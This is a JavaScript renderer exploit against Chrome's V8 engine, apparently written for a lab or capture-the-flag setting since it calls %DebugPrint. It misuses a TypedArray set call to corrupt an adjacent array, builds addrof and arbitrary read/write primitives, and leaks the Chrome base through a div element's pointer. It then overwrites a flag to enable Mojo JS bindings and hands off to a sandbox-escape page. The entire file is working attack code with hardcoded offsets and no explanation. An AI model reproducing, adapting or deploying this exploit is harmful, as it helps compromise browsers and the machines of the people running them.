let conversion_array = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_array);
let int_view = new BigUint64Array(conversion_array);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
}

BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}

Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

function pwn() {

    function setup_prims() {
        let a = new Uint32Array(1);
        let b = new Uint32Array(1);
        let oob = [1.1, 1.2, 1.3, 1.4];
        let addrof_array = [{}];
        let www_double = new Float64Array(1);

        a.set([0x8888], 0);
        b.set(a, 32);
        console.log("oob length = " + oob.length);

        eval("%DebugPrint(a);");
        eval("%DebugPrint(b);");
        eval("%DebugPrint(oob);")
        eval("%DebugPrint(addrof_array);");
        eval("%DebugPrint(www_double);");

        return [oob, addrof_array, www_double];
    }
    
    let [oob, addrof_array, www_double] = setup_prims();
    
    let original_28 = oob[28];
    let original_29 = oob[29];

    function addrof(obj) {
        addrof_array[0] = obj;
        return (oob[7].f2i() & 0xffffffffn) - 1n;
    }

    console.log("OOB 28 = " + oob[29]);

    let heap_upper = oob[28].f2i() & 0xffffffff00000000n;
    console.log("Heap upper " + heap_upper.hex());

     function arb_read64(addr) {
        oob[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
        oob[29] = (((addr - 0x8n) | 1n) & 0xffffffffn).i2f();
        return www_double[0].f2i();
    }

    function arb_write64(where, what) {
        oob[28] = ((where & 0xffffffff00000000n) | 7n).i2f();
        oob[29] = (((where - 0x8n) | 1n) & 0xffffffffn).i2f();
        www_double[0] = what.i2f();
    }
    
    let div = document.createElement('div');
    let div_addr = heap_upper | addrof(div);
    console.log("div address " + div_addr.hex());
    let addr_HTMLDivElement = arb_read64(div_addr + 0xCn);
    console.log("<HTMLDivElement> = ", addr_HTMLDivElement.hex());
    let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
    console.log("Chrome base " + chrome_base.hex());
    
    let mojo_js_enabled = chrome_base + 0xc560f0en;
    arb_write64(mojo_js_enabled, 0x0101010101010101n);

    //oob[28] = original_28;
    //oob[29] = original_29;

    window.location.href = "./sbx_exploit.html";
}

pwn()
